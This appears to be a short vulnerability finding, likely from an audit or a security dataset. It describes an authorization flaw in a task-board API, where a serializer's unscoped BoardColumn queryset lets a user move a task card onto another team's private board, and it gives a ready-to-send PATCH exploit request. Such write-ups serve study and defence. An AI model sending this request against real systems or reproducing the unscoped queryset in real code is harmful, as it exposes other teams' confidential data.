diagnosis: TaskCardSerializer defines column with an unscoped BoardColumn.objects.all() queryset. While get_queryset restricts TaskCard instances to the user's projects, updating a task card allows suppling a column hyperlink pointing to another team's private project board. The task card is moved into an unauthorized workspace, leaking confidential descriptions to other teams.
exploit_request:
PATCH /api/tasks/502/ HTTP/1.1
Host: agile.workspace.io
Authorization: Bearer <team_a_member_token>
Content-Type: application/json

{"column": "https://agile.workspace.io/api/board-columns/881/"}
